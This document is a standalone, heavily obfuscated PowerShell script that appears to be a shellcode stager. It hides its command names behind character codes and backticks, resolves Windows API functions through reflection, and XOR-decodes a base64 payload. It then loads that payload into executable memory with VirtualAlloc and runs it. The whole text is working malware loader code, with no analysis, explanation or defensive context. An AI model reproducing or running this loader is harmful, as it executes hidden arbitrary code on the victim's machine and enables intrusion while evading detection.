&([string]::join('', ( (83,101,116,45,83,116,114,105,99,116,77,111,100,101) |%{;$_;}|%{ ( [cHar][iNt] $_)}))) -Version 2
function `z`V`GD`oV`I`J`X`Gb`S {
	Param ($STkRZchzh, $IhfxfBdTfmh)		
	$sveEitZLO = ([AppDomain]::CurrentDomain.GetAssemblies() |%{;$_;}| &(("WiZaBnbhZZLfetyudwgSMerfJjrDe-TYHlXBiyIhelOyDSWbTbamejeJCobjcSJYYkTMLuXDEt")[0,7,12,22,12,29,42,6,25,12,60,13] -join '') { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$XWpIzplMiA = $sveEitZLO.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $XWpIzplMiA.Invoke($null, @([System.Runtime.InteropServices.HandleRef](&([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{$_}<##>|%{ ( [chAR][iNt] $_)}))) System.Runtime.InteropServices.HandleRef((&([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{$_}<##>|%{ ( [chAR][iNt] $_)}))) IntPtr), ($sveEitZLO.GetMethod('GetModuleHandle')).Invoke($null, @($STkRZchzh)))), $IhfxfBdTfmh))
}
function `jop`R`Cu`V`g`l`P`T`Gm {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $LTKFKchSHR,
		[Parameter(Position = 1)] [Type] $TsXJPdyTlp = [Void]
	)
	$bvzQKtTmB = [AppDomain]::CurrentDomain.DefineDynamicAssembly((&([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>%{$_}|%{ ( [chAR][iNt] $_)}))) System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$bvzQKtTmB.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $LTKFKchSHR).SetImplementationFlags('Runtime, Managed')
	$bvzQKtTmB.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $TsXJPdyTlp, $LTKFKchSHR).SetImplementationFlags('Runtime, Managed')
	return $bvzQKtTmB.CreateType()
}
If ([IntPtr]::size -eq 8) {
	[Byte[]]$XjzXOMZkYMT = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJimxomIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDGV7alUjn/Kn/aGcTi45ciCAzuBlaJv6B/Dh4UqpN8XxWBSs1h1A18JQGDHtANgC5dPWgpqn+Ch/f/duSQGayBAMpgc0lCM68Xx3bwdR8SN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLdEpNR0xUUANtdwMVDRIYA3RsdBUXGAN3UUpHRk1XDBQNExgDUVUZEhINEwoDT0pIRgNkRkBITC4pIx0dQETG5AJgGAc+CazdSK1el1sO/LreXxeW4RjHx3ZtaP2QwDGn2qCctOL4Lmw66KEMfW2qii6eIQ0xizgMB5zG5P+Gw/Uo1xnrOp+DELrfizNxfLkCeh6M17s3FS7DqgEn139chS2Jhe9tBgcvpNkfwgmvriV3PBJvWIhZsUcYqpEIwEVStgGuejmTRFI77eQvJcSwgbTmlPWTrvvEtYNK5yrQ63npZ7gC9gwlNLKP72gDn+vJkoDjtdmyvkRhFlLdTcWWFsRsEGpKpd9NLBtVMyMz6FP+PBIN4N0jYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayYjIyMjc+DLvN7c3BETFA0SGxMNERYQDRUTIxn9S5I=')
	for ($OLHwbuMUO = 0; $OLHwbuMUO -lt $XjzXOMZkYMT.Count; $OLHwbuMUO++) {
		$XjzXOMZkYMT[$OLHwbuMUO] = $XjzXOMZkYMT[$OLHwbuMUO] -bxor 35
	}
	$BoxGGeKtKO = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((`z`V`GD`oV`I`J`X`Gb`S kernel32.dll VirtualAlloc), (`jop`R`Cu`V`g`l`P`T`Gm @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$xHRZOevuAS = $BoxGGeKtKO.Invoke([IntPtr]::Zero, $XjzXOMZkYMT.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($XjzXOMZkYMT, 0, $xHRZOevuAS, $XjzXOMZkYMT.length)
	$VtaPVXcAm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xHRZOevuAS, (`jop`R`Cu`V`g`l`P`T`Gm @([IntPtr]) ([Void])))
	$VtaPVXcAm.Invoke([IntPtr]::Zero)
}
